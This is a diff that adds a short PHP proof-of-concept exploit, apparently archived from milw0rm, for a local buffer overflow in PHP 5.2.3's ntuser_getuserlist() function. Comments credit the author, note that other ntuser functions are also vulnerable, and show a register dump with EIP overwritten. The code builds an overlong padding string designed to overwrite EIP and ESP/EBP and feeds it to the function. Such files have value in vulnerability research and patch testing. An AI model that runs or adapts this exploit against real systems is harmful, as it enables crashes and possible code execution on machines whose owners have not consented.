@@ -1,0 +1,44 @@
+<?php
+//PHP 5.2.3 php_ntuser ntuser_getuserlist() Local Buffer Overflow
+//author: shinnai
+//mail: shinnai[at]autistici[dot]org
+//site: http://shinnai.altervista.org
+
+//greetz to BrainBugger Crew
+//http://www.brainbugger.altervista.org/
+
+//Bug discovered with "Footzo" (thanks to rgod) modified.
+
+//To download Footzo:
+//original link: http://godr.altervista.org/index.php?mod=Download/useful_tools#footzo.rar
+//alternative: http://www.shinnai.altervista.org/index.php?mod=Download/Utilities#footzo.rar
+
+//also theese are vulnerable:
+//ntuser_getusergroups <-- DoS, we control EAX
+//ntuser_getdomaincontroller <-- DoS, we control EAX
+//ntuser_getuserinfo <-- BoF, we control EIP 00410041
+
+//This is the content of registers:
+
+//EAX FFFFFFFE
+//ECX 00000754
+//EDX 00000041
+//EBX 00223D18
+//ESP 00C0FB34 UNICODE "CCC... x 100"
+//EBP 00C0FBD0 UNICODE "CCC + DDD... x 100"
+//ESI 011AC4A8
+//EDI 011ADC00
+//EIP 00410041
+
+$buff    = str_repeat("\x41", 250);
+
+$get_EIP = "\x42\x42";
+
+$get_ESP = str_repeat("\x43", 100);
+
+$get_EBP = str_repeat("\x44", 100);
+
+ntuser_getuserlist($buff.$get_EIP.$get_ESP.$get_EBP);
+?>
+
+# milw0rm.com [2007-08-23]
